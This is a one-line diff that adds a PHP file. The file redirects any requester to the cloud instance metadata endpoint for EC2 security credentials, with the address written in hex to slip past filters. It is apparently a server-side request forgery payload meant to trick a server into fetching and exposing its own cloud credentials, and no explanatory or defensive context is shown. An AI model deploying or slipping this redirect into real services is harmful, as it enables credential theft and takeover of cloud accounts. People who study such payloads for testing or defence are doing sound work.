@@ -1,0 +1,1 @@
+<?php header('Location: http://0xA9FEA9FE/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance', TRUE, 303); ?>
